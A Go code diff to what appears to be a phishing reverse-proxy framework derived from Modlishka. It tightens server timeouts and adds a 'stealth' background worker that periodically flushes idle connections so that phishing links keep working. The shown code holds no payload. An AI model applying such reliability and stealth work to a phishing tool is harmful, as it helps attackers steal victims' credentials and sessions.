@@ -204,17 +204,22 @@ const (
 )
 
 const (
-	httpReadTimeout  = 600 * time.Second
-	httpWriteTimeout = 600 * time.Second
+	httpReadTimeout       = 120 * time.Second // Reduced from 600s - prevents hung connections
+	httpWriteTimeout      = 120 * time.Second // Reduced from 600s
+	httpIdleTimeout       = 120 * time.Second // Close idle client connections after 2 min
+	httpReadHeaderTimeout = 10 * time.Second  // Fast header read timeout
 
 	// Connection pool and speed optimization settings
 	maxIdleConns        = 200              // Total idle connections across all hosts
 	maxIdleConnsPerHost = 50               // Idle connections per-host (default is 2!)
 	maxConnsPerHost     = 100              // Max total connections per-host
-	idleConnTimeout     = 90 * time.Second // Keep idle connections alive longer
+	idleConnTimeout     = 60 * time.Second // Reduced from 90s - flush stale connections faster
 	tlsHandshakeTimeout = 10 * time.Second // TLS handshake deadline
 	expectContTimeout   = 1 * time.Second  // Expect: 100-continue timeout
 	respHeaderTimeout   = 30 * time.Second // Wait for response headers
+
+	// Stealth/reliability: periodic maintenance
+	connPoolRefreshInterval = 5 * time.Minute // Flush stale connections periodically
 )
 
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
@@ -267,6 +272,7 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	stopChan          chan struct{} // For graceful shutdown
 }
 
 type ProxySession struct {
@@ -356,10 +362,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	}
 
 	p.Server = &http.Server{
-		Addr:         fmt.Sprintf("%s:%d", hostname, port),
-		Handler:      p.Proxy,
-		ReadTimeout:  httpReadTimeout,
-		WriteTimeout: httpWriteTimeout,
+		Addr:              fmt.Sprintf("%s:%d", hostname, port),
+		Handler:           p.Proxy,
+		ReadTimeout:       httpReadTimeout,
+		WriteTimeout:      httpWriteTimeout,
+		IdleTimeout:       httpIdleTimeout,       // Close idle connections to prevent resource leak
+		ReadHeaderTimeout: httpReadHeaderTimeout, // Fast timeout for slow clients/attacks
 	}
 
 	if cfg.proxyConfig.Enabled {
@@ -4332,8 +4340,39 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 }
 
 func (p *HttpProxy) Start() error {
+	p.stopChan = make(chan struct{})
 	go p.httpsWorker()
+	go p.connectionMaintenanceWorker() // Stealth: keep connections fresh
 	return nil
+}
+
+// connectionMaintenanceWorker periodically clears stale connections to prevent
+// the "link doesn't work after running for a while" issue. This ensures:
+// 1. Dead upstream connections are flushed
+// 2. TLS session cache stays fresh
+// 3. Connection pool doesn't accumulate broken connections
+func (p *HttpProxy) connectionMaintenanceWorker() {
+	ticker := time.NewTicker(connPoolRefreshInterval)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			// Flush all idle connections - forces fresh connections on next request
+			p.Proxy.Tr.CloseIdleConnections()
+			log.Debug("[stealth] connection pool refreshed")
+		case <-p.stopChan:
+			return
+		}
+	}
+}
+
+// Stop cleanly shuts down the proxy and background workers
+func (p *HttpProxy) Stop() {
+	if p.stopChan != nil {
+		close(p.stopChan)
+	}
+	p.Proxy.Tr.CloseIdleConnections()
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
